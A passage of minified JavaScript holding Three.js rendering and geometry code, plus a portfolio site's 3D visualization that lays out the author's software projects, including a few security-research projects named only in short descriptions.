0&&(Ee=Ee[me]),Ee){fe.bindFramebuffer(N.FRAMEBUFFER,Ee);try{const be=b.texture,Ne=be.format,we=be.type;if(Ne!==kt&&de.convert(Ne)!==N.getParameter(N.IMPLEMENTATION_COLOR_READ_FORMAT)){console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.");return}const Ce=we===hi&&(ve.has("EXT_color_buffer_half_float")||Re.isWebGL2&&ve.has("EXT_color_buffer_float"));if(we!==ln&&de.convert(we)!==N.getParameter(N.IMPLEMENTATION_COLOR_READ_TYPE)&&!(we===sn&&(Re.isWebGL2||ve.has("OES_texture_float")||ve.has("WEBGL_color_buffer_float")))&&!Ce){console.error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.");return}I>=0&&I<=b.width-B&&F>=0&&F<=b.height-O&&N.readPixels(I,F,B,O,de.convert(Ne),de.convert(we),le)}finally{const be=T!==null?Le.get(T).__webglFramebuffer:null;fe.bindFramebuffer(N.FRAMEBUFFER,be)}}},this.copyFramebufferToTexture=function(b,I,F=0){const B=Math.pow(2,-F),O=Math.floor(I.image.width*B),le=Math.floor(I.image.height*B);A.setTexture2D(I,0),N.copyTexSubImage2D(N.TEXTURE_2D,F,0,0,b.x,b.y,O,le),fe.unbindTexture()},this.copyTextureToTexture=function(b,I,F,B=0){const O=I.image.width,le=I.image.height,me=de.convert(F.format),Ee=de.convert(F.type);A.setTexture2D(F,0),N.pixelStorei(N.UNPACK_FLIP_Y_WEBGL,F.flipY),N.pixelStorei(N.UNPACK_PREMULTIPLY_ALPHA_WEBGL,F.premultiplyAlpha),N.pixelStorei(N.UNPACK_ALIGNMENT,F.unpackAlignment),I.isDataTexture?N.texSubImage2D(N.TEXTURE_2D,B,b.x,b.y,O,le,me,Ee,I.image.data):I.isCompressedTexture?N.compressedTexSubImage2D(N.TEXTURE_2D,B,b.x,b.y,I.mipmaps[0].width,I.mipmaps[0].height,me,I.mipmaps[0].data):N.texSubImage2D(N.TEXTURE_2D,B,b.x,b.y,me,Ee,I.image),B===0&&F.generateMipmaps&&N.generateMipmap(N.TEXTURE_2D),fe.unbindTexture()},this.copyTextureToTexture3D=function(b,I,F,B,O=0){if(_.isWebGL1Renderer){console.warn("THREE.WebGLRenderer.copyTextureToTexture3D: can only be used with WebGL2.");return}const le=b.max.x-b.min.x+1,me=b.max.y-b.min.y+1,Ee=b.max.z-b.min.z+1,be=de.convert(B.format),Ne=de.convert(B.type);let we;if(B.isData3DTexture)A.setTexture3D(B,0),we=N.TEXTURE_3D;else if(B.isDataArrayTexture||B.isCompressedArrayTexture)A.setTexture2DArray(B,0),we=N.TEXTURE_2D_ARRAY;else{console.warn("THREE.WebGLRenderer.copyTextureToTexture3D: only supports THREE.DataTexture3D and THREE.DataTexture2DArray.");return}N.pixelStorei(N.UNPACK_FLIP_Y_WEBGL,B.flipY),N.pixelStorei(N.UNPACK_PREMULTIPLY_ALPHA_WEBGL,B.premultiplyAlpha),N.pixelStorei(N.UNPACK_ALIGNMENT,B.unpackAlignment);const Ce=N.getParameter(N.UNPACK_ROW_LENGTH),et=N.getParameter(N.UNPACK_IMAGE_HEIGHT),St=N.getParameter(N.UNPACK_SKIP_PIXELS),at=N.getParameter(N.UNPACK_SKIP_ROWS),Vt=N.getParameter(N.UNPACK_SKIP_IMAGES),$e=F.isCompressedTexture?F.mipmaps[O]:F.image;N.pixelStorei(N.UNPACK_ROW_LENGTH,$e.width),N.pixelStorei(N.UNPACK_IMAGE_HEIGHT,$e.height),N.pixelStorei(N.UNPACK_SKIP_PIXELS,b.min.x),N.pixelStorei(N.UNPACK_SKIP_ROWS,b.min.y),N.pixelStorei(N.UNPACK_SKIP_IMAGES,b.min.z),F.isDataTexture||F.isData3DTexture?N.texSubImage3D(we,O,I.x,I.y,I.z,le,me,Ee,be,Ne,$e.data):F.isCompressedArrayTexture?(console.warn("THREE.WebGLRenderer.copyTextureToTexture3D: untested support for compressed srcTexture."),N.compressedTexSubImage3D(we,O,I.x,I.y,I.z,le,me,Ee,be,$e.data)):N.texSubImage3D(we,O,I.x,I.y,I.z,le,me,Ee,be,Ne,$e),N.pixelStorei(N.UNPACK_ROW_LENGTH,Ce),N.pixelStorei(N.UNPACK_IMAGE_HEIGHT,et),N.pixelStorei(N.UNPACK_SKIP_PIXELS,St),N.pixelStorei(N.UNPACK_SKIP_ROWS,at),N.pixelStorei(N.UNPACK_SKIP_IMAGES,Vt),O===0&&B.generateMipmaps&&N.generateMipmap(we),fe.unbindTexture()},this.initTexture=function(b){b.isCubeTexture?A.setTextureCube(b,0):b.isData3DTexture?A.setTexture3D(b,0):b.isDataArrayTexture||b.isCompressedArrayTexture?A.setTexture2DArray(b,0):A.setTexture2D(b,0),fe.unbindTexture()},this.resetState=function(){w=0,M=0,T=null,fe.reset(),Pe.reset()},typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}get coordinateSystem(){return $t}get outputColorSpace(){return this._outputColorSpace}set outputColorSpace(e){this._outputColorSpace=e;const t=this.getContext();t.drawingBufferColorSpace=e===os?"display-p3":"srgb",t.unpackColorSpace=We.workingColorSpace===nr?"display-p3":"srgb"}get outputEncoding(){return console.warn("THREE.WebGLRenderer: Property .outputEncoding has been removed. Use .outputColorSpace instead."),this.outputColorSpace===lt?Mn:uo}set outputEncoding(e){console.warn("THREE.WebGLRenderer: Property .outputEncoding has been removed. Use .outputColorSpace instead."),this.outputColorSpace=e===Mn?lt:Zt}get useLegacyLights(){return console.warn("THREE.WebGLRenderer: The property .useLegacyLights has been deprecated. Migrate your lighting according to the following guide: https://discourse.threejs.org/t/updates-to-lighting-in-three-js-r155/53733."),this._useLegacyLights}set useLegacyLights(e){console.warn("THREE.WebGLRenderer: The property .useLegacyLights has been deprecated. Migrate your lighting according to the following guide: https://discourse.threejs.org/t/updates-to-lighting-in-three-js-r155/53733."),this._useLegacyLights=e}}class Kf extends Io{}Kf.prototype.isWebGL1Renderer=!0;class $f extends yt{constructor(){super(),this.isScene=!0,this.type="Scene",this.background=null,this.environment=null,this.fog=null,this.backgroundBlurriness=0,this.backgroundIntensity=1,this.overrideMaterial=null,typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}copy(e,t){return super.copy(e,t),e.background!==null&&(this.background=e.background.clone()),e.environment!==null&&(this.environment=e.environment.clone()),e.fog!==null&&(this.fog=e.fog.clone()),this.backgroundBlurriness=e.backgroundBlurriness,this.backgroundIntensity=e.backgroundIntensity,e.overrideMaterial!==null&&(this.overrideMaterial=e.overrideMaterial.clone()),this.matrixAutoUpdate=e.matrixAutoUpdate,this}toJSON(e){const t=super.toJSON(e);return this.fog!==null&&(t.object.fog=this.fog.toJSON()),this.backgroundBlurriness>0&&(t.object.backgroundBlurriness=this.backgroundBlurriness),this.backgroundIntensity!==1&&(t.object.backgroundIntensity=this.backgroundIntensity),t}}class Ba extends zt{constructor(e,t,n,r=1){super(e,t,n),this.isInstancedBufferAttribute=!0,this.meshPerAttribute=r}copy(e){return super.copy(e),this.meshPerAttribute=e.meshPerAttribute,this}toJSON(){const e=super.toJSON();return e.meshPerAttribute=this.meshPerAttribute,e.isInstancedBufferAttribute=!0,e}}const Wn=new Ze,Ga=new Ze,Vi=[],Ha=new Rn,Zf=new Ze,li=new Ht,ci=new ei;class Gr extends Ht{constructor(e,t,n){super(e,t),this.isInstancedMesh=!0,this.instanceMatrix=new Ba(new Float32Array(n*16),16),this.instanceColor=null,this.count=n,this.boundingBox=null,this.boundingSphere=null;for(let r=0;r<n;r++)this.setMatrixAt(r,Zf)}computeBoundingBox(){const e=this.geometry,t=this.count;this.boundingBox===null&&(this.boundingBox=new Rn),e.boundingBox===null&&e.computeBoundingBox(),this.boundingBox.makeEmpty();for(let n=0;n<t;n++)this.getMatrixAt(n,Wn),Ha.copy(e.boundingBox).applyMatrix4(Wn),this.boundingBox.union(Ha)}computeBoundingSphere(){const e=this.geometry,t=this.count;this.boundingSphere===null&&(this.boundingSphere=new ei),e.boundingSphere===null&&e.computeBoundingSphere(),this.boundingSphere.makeEmpty();for(let n=0;n<t;n++)this.getMatrixAt(n,Wn),ci.copy(e.boundingSphere).applyMatrix4(Wn),this.boundingSphere.union(ci)}copy(e,t){return super.copy(e,t),this.instanceMatrix.copy(e.instanceMatrix),e.instanceColor!==null&&(this.instanceColor=e.instanceColor.clone()),this.count=e.count,e.boundingBox!==null&&(this.boundingBox=e.boundingBox.clone()),e.boundingSphere!==null&&(this.boundingSphere=e.boundingSphere.clone()),this}getColorAt(e,t){t.fromArray(this.instanceColor.array,e*3)}getMatrixAt(e,t){t.fromArray(this.instanceMatrix.array,e*16)}raycast(e,t){const n=this.matrixWorld,r=this.count;if(li.geometry=this.geometry,li.material=this.material,li.material!==void 0&&(this.boundingSphere===null&&this.computeBoundingSphere(),ci.copy(this.boundingSphere),ci.applyMatrix4(n),e.ray.intersectsSphere(ci)!==!1))for(let s=0;s<r;s++){this.getMatrixAt(s,Wn),Ga.multiplyMatrices(n,Wn),li.matrixWorld=Ga,li.raycast(e,Vi);for(let o=0,a=Vi.length;o<a;o++){const l=Vi[o];l.instanceId=s,l.object=this,t.push(l)}Vi.length=0}}setColorAt(e,t){this.instanceColor===null&&(this.instanceColor=new Ba(new Float32Array(this.instanceMatrix.count*3),3)),t.toArray(this.instanceColor.array,e*3)}setMatrixAt(e,t){t.toArray(this.instanceMatrix.array,e*16)}updateMorphTargets(){}dispose(){this.dispatchEvent({type:"dispose"})}}class Ji extends gi{constructor(e){super(),this.isLineBasicMaterial=!0,this.type="LineBasicMaterial",this.color=new He(16777215),this.map=null,this.linewidth=1,this.linecap="round",this.linejoin="round",this.fog=!0,this.setValues(e)}copy(e){return super.copy(e),this.color.copy(e.color),this.map=e.map,this.linewidth=e.linewidth,this.linecap=e.linecap,this.linejoin=e.linejoin,this.fog=e.fog,this}}const Va=new L,Wa=new L,Xa=new Ze,Hr=new ls,Wi=new ei;class Qf extends yt{constructor(e=new It,t=new Ji){super(),this.isLine=!0,this.type="Line",this.geometry=e,this.material=t,this.updateMorphTargets()}copy(e,t){return super.copy(e,t),this.material=Array.isArray(e.material)?e.material.slice():e.material,this.geometry=e.geometry,this}computeLineDistances(){const e=this.geometry;if(e.index===null){const t=e.attributes.position,n=[0];for(let r=1,s=t.count;r<s;r++)Va.fromBufferAttribute(t,r-1),Wa.fromBufferAttribute(t,r),n[r]=n[r-1],n[r]+=Va.distanceTo(Wa);e.setAttribute("lineDistance",new dt(n,1))}else console.warn("THREE.Line.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");return this}raycast(e,t){const n=this.geometry,r=this.matrixWorld,s=e.params.Line.threshold,o=n.drawRange;if(n.boundingSphere===null&&n.computeBoundingSphere(),Wi.copy(n.boundingSphere),Wi.applyMatrix4(r),Wi.radius+=s,e.ray.intersectsSphere(Wi)===!1)return;Xa.copy(r).invert(),Hr.copy(e.ray).applyMatrix4(Xa);const a=s/((this.scale.x+this.scale.y+this.scale.z)/3),l=a*a,d=new L,u=new L,h=new L,p=new L,m=this.isLineSegments?2:1,E=n.index,f=n.attributes.position;if(E!==null){const c=Math.max(0,o.start),g=Math.min(E.count,o.start+o.count);for(let _=c,v=g-1;_<v;_+=m){const w=E.getX(_),M=E.getX(_+1);if(d.fromBufferAttribute(f,w),u.fromBufferAttribute(f,M),Hr.distanceSqToSegment(d,u,p,h)>l)continue;p.applyMatrix4(this.matrixWorld);const D=e.ray.origin.distanceTo(p);D<e.near||D>e.far||t.push({distance:D,point:h.clone().applyMatrix4(this.matrixWorld),index:_,face:null,faceIndex:null,object:this})}}else{const c=Math.max(0,o.start),g=Math.min(f.count,o.start+o.count);for(let _=c,v=g-1;_<v;_+=m){if(d.fromBufferAttribute(f,_),u.fromBufferAttribute(f,_+1),Hr.distanceSqToSegment(d,u,p,h)>l)continue;p.applyMatrix4(this.matrixWorld);const M=e.ray.origin.distanceTo(p);M<e.near||M>e.far||t.push({distance:M,point:h.clone().applyMatrix4(this.matrixWorld),index:_,face:null,faceIndex:null,object:this})}}}updateMorphTargets(){const t=this.geometry.morphAttributes,n=Object.keys(t);if(n.length>0){const r=t[n[0]];if(r!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let s=0,o=r.length;s<o;s++){const a=r[s].name||String(s);this.morphTargetInfluences.push(0),this.morphTargetDictionary[a]=s}}}}}const qa=new L,Ya=new L;class is extends Qf{constructor(e,t){super(e,t),this.isLineSegments=!0,this.type="LineSegments"}computeLineDistances(){const e=this.geometry;if(e.index===null){const t=e.attributes.position,n=[];for(let r=0,s=t.count;r<s;r+=2)qa.fromBufferAttribute(t,r),Ya.fromBufferAttribute(t,r+1),n[r]=r===0?0:n[r-1],n[r+1]=n[r]+qa.distanceTo(Ya);e.setAttribute("lineDistance",new dt(n,1))}else console.warn("THREE.LineSegments.computeLineDistances(): Computation only possible with non-indexed BufferGeometry.");return this}}class er extends It{constructor(e=.5,t=1,n=32,r=1,s=0,o=Math.PI*2){super(),this.type="RingGeometry",this.parameters={innerRadius:e,outerRadius:t,thetaSegments:n,phiSegments:r,thetaStart:s,thetaLength:o},n=Math.max(3,n),r=Math.max(1,r);const a=[],l=[],d=[],u=[];let h=e;const p=(t-e)/r,m=new L,E=new Be;for(let x=0;x<=r;x++){for(let f=0;f<=n;f++){const c=s+f/n*o;m.x=h*Math.cos(c),m.y=h*Math.sin(c),l.push(m.x,m.y,m.z),d.push(0,0,1),E.x=(m.x/t+1)/2,E.y=(m.y/t+1)/2,u.push(E.x,E.y)}h+=p}for(let x=0;x<r;x++){const f=x*(n+1);for(let c=0;c<n;c++){const g=c+f,_=g,v=g+n+1,w=g+n+2,M=g+1;a.push(_,v,M),a.push(v,w,M)}}this.setIndex(a),this.setAttribute("position",new dt(l,3)),this.setAttribute("normal",new dt(d,3)),this.setAttribute("uv",new dt(u,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new er(e.innerRadius,e.outerRadius,e.thetaSegments,e.phiSegments,e.thetaStart,e.thetaLength)}}class ps extends It{constructor(e=1,t=32,n=16,r=0,s=Math.PI*2,o=0,a=Math.PI){super(),this.type="SphereGeometry",this.parameters={radius:e,widthSegments:t,heightSegments:n,phiStart:r,phiLength:s,thetaStart:o,thetaLength:a},t=Math.max(3,Math.floor(t)),n=Math.max(2,Math.floor(n));const l=Math.min(o+a,Math.PI);let d=0;const u=[],h=new L,p=new L,m=[],E=[],x=[],f=[];for(let c=0;c<=n;c++){const g=[],_=c/n;let v=0;c===0&&o===0?v=.5/t:c===n&&l===Math.PI&&(v=-.5/t);for(let w=0;w<=t;w++){const M=w/t;h.x=-e*Math.cos(r+M*s)*Math.sin(o+_*a),h.y=e*Math.cos(o+_*a),h.z=e*Math.sin(r+M*s)*Math.sin(o+_*a),E.push(h.x,h.y,h.z),p.copy(h).normalize(),x.push(p.x,p.y,p.z),f.push(M+v,1-_),g.push(d++)}u.push(g)}for(let c=0;c<n;c++)for(let g=0;g<t;g++){const _=u[c][g+1],v=u[c][g],w=u[c+1][g],M=u[c+1][g+1];(c!==0||o>0)&&m.push(_,v,M),(c!==n-1||l<Math.PI)&&m.push(v,w,M)}this.setIndex(m),this.setAttribute("position",new dt(E,3)),this.setAttribute("normal",new dt(x,3)),this.setAttribute("uv",new dt(f,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new ps(e.radius,e.widthSegments,e.heightSegments,e.phiStart,e.phiLength,e.thetaStart,e.thetaLength)}}class Lo{constructor(e,t,n=0,r=1/0){this.ray=new ls(e,t),this.near=n,this.far=r,this.camera=null,this.layers=new cs,this.params={Mesh:{},Line:{threshold:1},LOD:{},Points:{threshold:1},Sprite:{}}}set(e,t){this.ray.set(e,t)}setFromCamera(e,t){t.isPerspectiveCamera?(this.ray.origin.setFromMatrixPosition(t.matrixWorld),this.ray.direction.set(e.x,e.y,.5).unproject(t).sub(this.ray.origin).normalize(),this.camera=t):t.isOrthographicCamera?(this.ray.origin.set(e.x,e.y,(t.near+t.far)/(t.near-t.far)).unproject(t),this.ray.direction.set(0,0,-1).transformDirection(t.matrixWorld),this.camera=t):console.error("THREE.Raycaster: Unsupported camera type: "+t.type)}intersectObject(e,t=!0,n=[]){return rs(e,this,n,t),n.sort(ja),n}intersectObjects(e,t=!0,n=[]){for(let r=0,s=e.length;r<s;r++)rs(e[r],this,n,t);return n.sort(ja),n}}function ja(i,e){return i.distance-e.distance}function rs(i,e,t,n){if(i.layers.test(e.layers)&&i.raycast(e,t),n===!0){const r=i.children;for(let s=0,o=r.length;s<o;s++)rs(r[s],e,t,!0)}}typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("register",{detail:{revision:ss}}));typeof window<"u"&&(window.__THREE__?console.warn("WARNING: Multiple instances of Three.js being imported."):window.__THREE__=ss);function Jf(){const i=new Ct(35,1,1,5e3);i.position.set(0,0,1100),i.lookAt(0,0,0);let e=0,t=0,n=.7,r=0,s=0,o=.7,a=!1,l=0,d=0,u=0,h=0;const p=.005,m=new Map;let E=0,x=1;const f=v=>{if(m.set(v.pointerId,{x:v.clientX,y:v.clientY}),m.size===1)a=!0,l=v.clientX,d=v.clientY;else if(m.size===2){a=!1;const w=Array.from(m.values()),M=w[0].x-w[1].x,T=w[0].y-w[1].y;E=Math.hypot(M,T),x=o}},c=v=>{m.delete(v.pointerId),m.size<2&&(E=0),m.size===0&&(a=!1)},g=v=>{if(m.has(v.pointerId)&&m.set(v.pointerId,{x:v.clientX,y:v.clientY}),m.size>=2&&E>0){const w=Array.from(m.values()),M=w[0].x-w[1].x,T=w[0].y-w[1].y,y=Math.hypot(M,T)/E;o=Math.max(.4,Math.min(2.5,x*y));return}if(a){const w=v.clientX-l,M=v.clientY-d;l=v.clientX,d=v.clientY,r+=w*.005,s=Math.max(-.6,Math.min(.6,s+M*.003))}else u=(v.clientX/window.innerWidth-.5)*.06,h=(v.clientY/window.innerHeight-.5)*.04},_=v=>{v.preventDefault(),o=Math.max(.4,Math.min(2.5,o*(1-v.deltaY*8e-4)))};return{camera:i,update(v){e+=(r-e)*.08,t+=(s-t)*.08,n+=(o-n)*.08,!a&&m.size===0&&(r+=p*v);const w=1100/n,M=e+u,T=t+h;i.position.x=w*Math.sin(M)*Math.cos(T),i.position.y=w*Math.sin(T),i.position.z=w*Math.cos(M)*Math.cos(T),i.lookAt(0,0,0)},attach(v){return v.addEventListener("pointerdown",f),v.addEventListener("pointerup",c),v.addEventListener("pointercancel",c),v.addEventListener("pointerleave",c),v.addEventListener("pointermove",g),v.addEventListener("wheel",_,{passive:!1}),()=>{v.removeEventListener("pointerdown",f),v.removeEventListener("pointerup",c),v.removeEventListener("pointercancel",c),v.removeEventListener("pointerleave",c),v.removeEventListener("pointermove",g),v.removeEventListener("wheel",_)}}}}function fs(i){let e=i>>>0;const t=()=>(e=e*1664525+1013904223>>>0,(e>>>0)/4294967296);return t.gauss=()=>{let n=0,r=0;for(;!n;)n=t();for(;!r;)r=t();return Math.sqrt(-2*Math.log(n))*Math.cos(2*Math.PI*r)},t}const bn=[{id:"vaal",name:"VAAL",tier:1,nodeCount:140,lang:["python"],category:"ai",blurb:"AI coding agent CLI. Routes prompts across local Ollama models and cloud LLMs (Claude, OpenAI). Tool-use orchestration, install scaffolding, named for the PoE Vaal Orb.",githubUrl:"https://github.com/0xE666/vaal",pinIds:["vaal_route","vaal_tooluse"]},{id:"winint",name:"WINDOWS-INTERNALS",tier:1,nodeCount:140,lang:["cpp","c"],category:"security",blurb:"Educational whitehat security research: Windows process internals, PE-format manual mapping, kernel-driver dispatch, signature scanning, IAT patching. Documents the techniques the Windows AC/EDR landscape was built to detect.",pinIds:["manual_map","sigscan","ioctl_dispatch","iat_patch","intel_mmmap","intel_mapio","kernel_resolver","kernel_init_user","page_walk","page_protect_check","drv_entry","drv_ift_probe","mm_section_map","mm_reloc","mm_imports","mem_read","mem_protect","irp_dispatch","grdv_naldrv","grdv_ntoskrnl","grdv_shellcode","hvci_kforge","hvci_exploit","vuln_pe","ekm_freeze","hijack_window","lua_injector"]},{id:"soundmap",name:"SOUNDMAP-API",tier:2,nodeCount:75,lang:["python"],category:"security",blurb:"Python wrapper for the Soundmap iOS app, reverse-engineered from observed traffic. Replays signed mobile API requests for automated trading and song collection.",githubUrl:"https://github.com/0xE666/Soundmap-API",pinIds:["soundmap_sign","soundmap_request"]},{id:"poe_null",name:"POE_NULL",tier:2,nodeCount:70,lang:["csharp"],category:"game-tool",blurb:"C# Path of Exile 2 game-state visualizer. Real-time scene reconstruction and item-state diffing.",githubUrl:"https://github.com/0xE666/poe_null",pinIds:["poe_null_scene"]},{id:"trade_api",name:"POE-TRADE-API",tier:2,nodeCount:70,lang:["python"],category:"game-tool",blurb:"Python client for the Path of Exile trade API. Token-bucket rate limiter, session pooling, paginated query streaming.",githubUrl:"https://github.com/0xE666/path-of-exile-trade-api",pinIds:["trade_limit"]},{id:"poe_watcher",name:"POE-WATCHER",tier:2,nodeCount:65,lang:["python"],category:"game-tool",blurb:"Lightweight Windows tray utility. Detects which PoE process is foreground (1 vs 2) and launches the correct trading tool. <1% CPU, ~20MB RAM.",githubUrl:"https://github.com/0xE666/path-of-exile-watcher",pinIds:["poe_watcher_detect"]},{id:"minabot",name:"MINABOT",tier:3,nodeCount:45,lang:["python"],category:"bot",blurb:"Multi-purpose Discord bot. Cogs-based plugin architecture, async DB layer, scheduled scraping tasks.",githubUrl:"https://github.com/0xE666/minaBot",pinIds:["minabot_cog"]},{id:"pentest",name:"PENTEST-FRAMEWORK",tier:3,nodeCount:45,lang:["python"],category:"security",blurb:"Modular pentest framework. Pluggable payloads, wordlists, plugins, and report renderer.",pinIds:["pentest_plugin"]},{id:"crypto",name:"ALGO-TRADING",tier:3,nodeCount:45,lang:["python"],category:"data",blurb:"Algorithmic crypto trading toolkit. Alpha generation, backtesting engine, dashboard.",pinIds:["crypto_backtest"]},{id:"poe_ml",name:"POE-ML",tier:3,nodeCount:40,lang:["python"],category:"data",blurb:"ML training pipeline for Path of Exile data — items, prices, build classification.",pinIds:["poe_ml_train"]},{id:"assistant",name:"ASSISTANT",tier:3,nodeCount:35,lang:["python"],category:"ai",blurb:"Personal AI assistant scaffolding (full description filled in at impl time after deeper repo inspection).",pinIds:[]},{id:"govdeals",name:"GOVDEALS",tier:4,nodeCount:22,lang:["python"],category:"web",blurb:"Government auction (govdeals.com) scraper and watch-list.",githubUrl:"https://github.com/0xE666/govdeals",pinIds:[]},{id:"dndb",name:"DNDBEYOND-SCRAPER",tier:4,nodeCount:22,lang:["python"],category:"web",blurb:"D&D Beyond data scraper. Authenticated session reuse, rate-aware pagination.",githubUrl:"https://github.com/0xE666/dndbeyond-scraper",pinIds:[]},{id:"espotify",name:"ESPOTIFY",tier:4,nodeCount:22,lang:["python"],category:"misc",blurb:"Controller-driven Spotify control. Pause / next / volume from a PS4/Xbox pad without alt-tabbing out of games.",githubUrl:"https://github.com/0xE666/eSpotify",pinIds:[]},{id:"anime",name:"ANIME.E-E.LOL",tier:4,nodeCount:22,lang:["php","js"],category:"web",blurb:"Anime streaming site. PHP backend with embed-proxy layer, scraping, history tracking.",pinIds:[]},{id:"movies",name:"MOVIES.E-E.LOL",tier:4,nodeCount:22,lang:["php","js"],category:"web",blurb:"Movies streaming site. Companion to anime.e-e.lol.",pinIds:[]},{id:"vergil",name:"VERGIL",tier:4,nodeCount:18,lang:["python"],category:"bot",blurb:"Discord bot for misterdrprof's colorful traders server.",githubUrl:"https://github.com/0xE666/vergil",pinIds:[]},{id:"rlbot",name:"RLBOT",tier:4,nodeCount:18,lang:["python"],category:"bot",blurb:"Discord bot for Rocket League stats.",githubUrl:"https://github.com/0xE666/RLBot",pinIds:[]},{id:"rocketmem",name:"ROCKETMEMORY",tier:4,nodeCount:20,lang:["python"],category:"security",blurb:"Educational memory-edit experiment: locating and modifying Rocket League camera-FoV/angle/distance pointers via signature scanning, beyond the in-game UI limits.",githubUrl:"https://github.com/0xE666/rocketMemory",pinIds:[]},{id:"tarkov_market",name:"TARKOV-MARKET-API",tier:4,nodeCount:18,lang:["python"],category:"game-tool",blurb:"Wrapper for tarkov-market.com flea/item endpoints.",githubUrl:"https://github.com/0xE666/Tarkov-Market-API-Wrapper",pinIds:[]},{id:"nep",name:"NEP",tier:4,nodeCount:16,lang:["python"],category:"data",blurb:"Audio fingerprint / modification experiment.",pinIds:[]},{id:"leetcode",name:"LEETCODE",tier:5,nodeCount:8,lang:["python"],category:"misc",blurb:"Solved problem archive.",githubUrl:"https://github.com/0xE666/leetcode",pinIds:[]}],eh=850,th=250,Xi=2500,Do=1600,No=900;function nh(i,e){const t=[[800,460,-40],[1180,240,280],[320,280,-260],[1300,720,220],[220,700,120],[1430,200,-180],[560,720,340],[1040,760,-300],[200,460,-80],[1500,460,60],[720,140,200],[120,180,-220],[880,800,280],[1060,140,-260],[400,140,140],[60,360,-340],[1540,580,320],[60,580,180],[1540,320,-200],[340,800,-120],[1180,800,240],[120,800,-280],[1540,100,300]],n=[...i].sort((s,o)=>s.tier-o.tier||o.nodeCount-s.nodeCount),r=[];for(let s=0;s<n.length;s++){const o=n[s],[a,l,d]=t[s]??[Do/2,No/2,0],u=a+(e()-.5)*30,h=l+(e()-.5)*30,p=d+(e()-.5)*60;r.push({id:o.id,project:o,x:Math.max(61,Math.min(1539,u)),y:Math.max(61,Math.min(839,h)),z:Math.max(-400,Math.min(400,p)),r:Math.max(45,o.nodeCount*1.6),nodes:0})}return r}function ih(i,e){const t=i.reduce((r,s)=>r+s.project.nodeCount,0),n=t>e?e/t:1;for(const r of i)r.nodes=Math.max(4,Math.round(r.project.nodeCount*n))}function rh(i,e,t=1){const n=fs(e),r=nh(i,n);ih(r,eh);const s=[];for(const a of r){const l=Math.max(4,Math.round(a.nodes*.78*t)),d=Math.max(0,Math.round((a.nodes-Math.round(a.nodes*.78))*t));for(let u=0;u<l;u++){const h=n(),p=a.r*.55*Math.pow(h,.55),m=n()*2-1,E=n()*Math.PI*2,x=Math.sqrt(1-m*m)*Math.cos(E),f=Math.sqrt(1-m*m)*Math.sin(E),c=m;s.push({x:a.x+x*p+n.gauss()*6,y:a.y+f*p+n.gauss()*6,z:a.z+c*p+n.gauss()*6,knotId:a.id,depth:.6+n()*.4})}for(let u=0;u<d;u++){const h=n()*2-1,p=n()*Math.PI*2,m=Math.sqrt(1-h*h)*Math.cos(p),E=Math.sqrt(1-h*h)*Math.sin(p),x=h,f=a.r*(.78+n()*.34);s.push({x:a.x+m*f,y:a.y+E*f,z:a.z+x*f,knotId:a.id,depth:.25+n()*.45})}}const o=Math.round(th*t);for(let a=0;a<o;a++)s.push({x:60+n()*(Do-120),y:60+n()*(No-120),z:(n()-.5)*800,knotId:null,depth:n()*.5});return{knots:r,nodes:s}}const sh=1600,ah=900,oh=(i,e,t=0)=>new L(i-sh/2,-(e-ah/2),t);function Ka(i,e,t,n=28){const r=[];for(let o=1;o<8;o++){const a=o/8*Math.PI,l=Math.sin(a),d=Math.cos(a);for(let u=0;u<n;u++){const h=u/n*Math.PI*2,p=(u+1)/n*Math.PI*2;r.push(Math.cos(h)*l*i,d*e,Math.sin(h)*l*t,Math.cos(p)*l*i,d*e,Math.sin(p)*l*t)}}for(let o=0;o<8;o++){const a=o/8*Math.PI*2;for(let l=0;l<n;l++){const d=l/n*Math.PI,u=(l+1)/n*Math.PI;r.push(Math.cos(a)*Math.sin(d)*i,Math.cos(d)*e,Math.sin(a)*Math.sin(d)*t,Math.cos(a)*Math.sin(u)*i,Math.cos(u)*e,Math.sin(a)*Math.sin(u)*t)}}const s=new It;return s.setAttribute("position",new dt(r,3)),s}function lh(i,e=66){const t=fs(e),n=new En,r=[];for(const s of i){const o=new En,a=oh(s.x,s.y,s.z);o.position.copy(a);const l=Math.max(3,Math.floor(s.r/35)),d=.55;for(let h=0;h<l;h++){const p=s.r*(.55+h*.1),m=.45+t()*.55,E=p,x=p*m,f=p*(.55+t()*.5),c=Ka(E,x,f,24),g=new Ji({color:16777215,transparent:!0,opacity:Math.max(.1,d-h*.06)}),_=new is(c,g);_.rotation.x=t()*Math.PI,_.rotation.y=t()*Math.PI,_.rotation.z=t()*Math.PI,o.add(_),r.push({mesh:_,vel:new L((t()-.5)*.04,(t()-.5)*.05,(t()-.5)*.03)})}const u=s.r*.22;for(let h=0;h<5;h++){const p=Ka(u,u*.4,u,16),m=new Ji({color:16777215,transparent:!0,opacity:.7}),E=new is(p,m);E.rotation.set(t()*Math.PI,t()*Math.PI,h*.6),o.add(E),r.push({mesh:E,vel:new L((t()-.5)*.08,(t()-.5)*.08,(t()-.5)*.05)})}n.add(o)}return{group:n,spins:r}}function ch(i,e){for(const t of i)t.mesh.rotation.x+=t.vel.x*e,t.mesh.rotation.y+=t.vel.y*e,t.mesh.rotation.z+=t.vel.z*e}const dh=(i,e)=>{const t=i.x-e.x,n=i.y-e.y,r=i.z-e.z;return t*t+n*n+r*r};function uh(i,e){const t=fs(e),n=i.nodes,r=Math.floor(Xi*.6),s=Math.floor(Xi*.25),o=Xi-r-s,a=[],l=[],d=[],u=new Map;for(let f=0;f<n.length;f++){const c=n[f].knotId;c&&(u.has(c)||u.set(c,[]),u.get(c).push(f))}e:for(const f of u.values())for(const c of f){const g=f.filter(_=>_!==c).map(_=>({j:_,d:dh(n[c],n[_])})).sort((_,v)=>_.d-v.d).slice(0,6+Math.floor(t()*4));for(const _ of g){if(a.length>=r)break 